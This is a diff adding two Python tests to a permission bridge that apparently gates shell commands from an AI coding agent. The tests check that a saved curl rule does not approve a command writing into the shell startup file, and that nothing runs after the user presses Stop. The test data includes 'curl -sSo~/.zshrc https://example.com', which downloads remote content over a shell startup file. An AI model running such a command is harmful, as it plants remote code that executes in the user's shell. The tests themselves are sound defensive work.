@@ -380,3 +380,39 @@ async def test_after_an_allowed_cd_harmless_commands_ask(fake_claude, tmp_path, 
     await run(bridge)
     assert [request["card"]["text"] for request in shown] == ["cd src", "ls"]
     assert behaviors(log) == ["allow", "allow", "allow"]
+
+
+async def test_a_saved_rule_never_covers_a_short_option_that_writes_outside(  # Decision 4, final review
+        fake_claude, tmp_path, project):
+    from ai_browser.app.powers import Rules
+
+    runner, log, script = fake_claude
+    script.write_text(json.dumps([INIT, ask("Bash", {"command": "curl -sSo~/.zshrc https://example.com"}), RESULT]),
+                      encoding="utf-8")
+    rules = Rules(tmp_path / "home")
+    rules.add(project, "Bash(curl:*)")
+    bridge, shown = bridge_for(tmp_path, runner, ["deny"], work=project, rules=rules)
+    await run(bridge)
+    assert len(shown) == 1 and shown[0]["card"]["always"] is False and behaviors(log) == ["deny"]
+
+
+async def test_after_stop_nothing_runs_not_even_a_harmless_or_ruled_command(  # Review Focus 3, final review
+        fake_claude, tmp_path, monkeypatch, repo):
+    from ai_browser.app import bridge as bridge_module
+    from ai_browser.app.powers import SUBAGENT_TOOL, Rules
+
+    monkeypatch.setattr(bridge_module, "STOP_GRACE", 3)
+    runner, log, script = fake_claude
+    script.write_text(json.dumps([{"ignore_interrupt": True}, INIT,
+                                  use("u1", SUBAGENT_TOOL, {"description": "Research", "prompt": "x"}), {"sleep": 1},
+                                  use("u2", "Bash", {"command": "git status"}, parent="u1"),
+                                  ask("Bash", {"command": "git status"}, tool_id="u2"),
+                                  ask("Bash", {"command": "npm test"}), RESULT]), encoding="utf-8")
+    rules = Rules(tmp_path / "home")
+    rules.add(repo, "Bash(npm test:*)")
+    bridge, shown = bridge_for(tmp_path, runner, ["once"], work=repo, rules=rules)
+    async for event in bridge.send("research it"):
+        if event["type"] == "subagent":
+            await bridge.stop()  # the user's Stop, while the sub-agent works
+    await bridge.close()
+    assert shown == [] and behaviors(log) == ["deny", "deny"]  # nothing runs after Stop, and no card shows
